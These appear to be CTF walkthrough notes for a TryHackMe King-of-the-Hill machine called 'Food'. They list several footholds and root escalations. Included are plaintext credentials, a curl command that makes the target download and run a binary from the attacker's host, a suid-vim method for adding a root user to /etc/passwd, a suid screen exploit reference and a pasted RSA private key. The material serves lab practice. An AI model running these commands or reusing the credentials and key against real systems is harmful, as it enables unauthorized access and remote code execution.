# Food KOTH machine

Foodhold options:

1. The following creds will get ssh access as `ramen`: `ramen:noodlesRTheBest`. These are gathered from the mysql DB exposed on 3306, which has the creds root:root and a single table called users in database users.
2. The website on port `:15065` will execute any request body posted to `/api/cmd`. This will get a foothold as the user `bread`.

  ```
  curl -d "wget $LHOST:1234/client -O /tmp/c && chmod +x /tmp/c && /tmp/c" $RHOST:15065/api/cmd
  ```
3. pasta's ssh key is below
4. port `46969` hosts telnet, `telnet <ip> 46969`. it gives the `food` user's creds encoded with vigenere (key o): `food:givemecookies`

Root options:

1. `/usr/bin/vim.basic` has the suid bit set. Use it to edit /etc/passwd, add a user line like `user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash` and su to root with `pass123`. vim.basic also has its gsuid bit set.
2. `/usr/bin/screen-4.5.0` has suid set, meaning that it can be used to write with root permissions. it overwrites so cant be used on passwd, but following (or just running) this will create a root shell: https://www.exploit-db.com/exploits/41154

Bread has write over `/etc/systemd/system/pings.service`, which runs their 15065 process. Not sure if this can be used to get root (since bread can't restart the service (though they do own it), or force the process to reload. Possibly replace main with a different binary? But it would still be run as 'bread'.

## Flags

- /root/flag
- /root/.profile
- /root/.mysql_history
- /home/bread/flag
- /home/food/.flag
- /home/tryhackme/flag7
- /var/flag.txt

## Pasta's SSH key

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAuMq9/6Il5rB2QANbYbuYOdb+16f9tIc/85ZW7vvelkzNHADr
HxUKmwcY53C0VWaOzQTzy+xFVwiKuVG3L2z2LQ2W6rSWbw3XCAy9BWnCmXewGOGJ
J7O0tWZoptlD4EY/1/YHdw9f49MWss7yJWT3V/pfytUrKJPiIaVbsHyahhbV1JLc
VfAq1jxPW3+LMbmvP6unvi5X0B4xoGbm64eTWQXHKak1A1wyjYFZtFz98ialAp/+
lwla6MpgJrtgeY6jjRHhkUd/WT0ud1JH+N4Lbldn1Z3Swc6TyEaDrO7v5YLe9ac0
jo/bfhr60X25apItar3VqkWicINZIrJMWSpzJwIDAQABAoIBADdnSdnYAqcMpxeA
Kii+NuC4jgWYb19t4YWlwIC8cTr84c4QlG3oQBrE4Pma9+ZW7l+XqYStXQjAHd98
GYEVmSVe2q2Z4TSAoMTgFNgHonmiweBj1lxZ68crYhsMLuaSCVg1gn121ZgX1Mld
dIozoFj3Tzsf+GWdGQJfcoMSiL3EngQgpxnYGBw5c1AC7DmxFr8NZq2ZlopvlO3Y
bgPWKLtORA4Mksbml8dM1yHsSq8Qg/dCtfe6ldGliqpLQMGj49UWvhbfr63c4+de
a/M247ykFXsW0q9e/ACYlDPFr177PMDK/0KRnY0JTtUeowoqYangAbp1ZTHZpNpj
hGEXGOkCgYEA7TDAu8bl+wDdl6XSdWZIJW2v7iV5ksOPBIqRU8xDX05nnnTY4uqO
9OKPwQo2Qx1gmnZpDAmi+ubW2TVtO75nPqcd/mofycrsKCvaZoGGfKkqyIfdPLZx
8pUsqd1gT2PPK+R22x9tYurlXCJjP2wXEOznBdyxbLYoYzRaIv8weTsCgYEAx3I8
8jWYddhl+wklyuKNX/hqeNgWSZAsUq4vyXK5x4u7Vqd9g0lyJhMCMHBCa7rEDCPf
U6mFhPeGDmqrECxZ9xfRofZq+AwJHAXxcmoou7z7S1Ga1P8N1y7LQGgmcrBw2lkf
kViBaMNGJFOLgtR/QbKzXa3TlfRSZ5sIy0N+7wUCgYEAnqsrczIV7PhiRC0Agdqf
TrJ2q0fUcRJzHOWZXEZbl2j6tiySXhHs+fKJmeg77l+7nPizQwM7TL6ZYQp1fS7d
IDNpRCU4CKS/oAvd+Q6Sqdf8r9L7c77UsSOLkkJuSA2LrGAUBnealD5wmlbCr82e
DIt97BT7d67Pi7WcyqaNhbsCgYB9TzErnLDlmci5KM4t4pmgqpt6wYl/Pq4aZIZx
szs2PHy/vQwG6KZndZnyhRW2SenTFtbB4ciZ+kqn1C0WREdiD/0OHZynrCgtCy7g
DAL7sYjRkbwOBxHTGPtqxAUkGedNyKEk2M6127q+KB+HW6t4w6YePZCqro73uViV
HRsrYQKBgQCaCQD3EX7im9B+CL2XfTCs3fp/WgL6Xw0otiMKHqEuBM9upU4LYs4F
jXaj5A1iFJibD6YoGGBt3sc7Wl2cS4YJO24GtOQlsgK/W2+VQANwQaYZOJPwrR2c
19IyrUe3VZjDbJQpLO1TwBdKj/MpcQhhB+m6WXhVYWkixfTTM6VSyg==
-----END RSA PRIVATE KEY-----
```
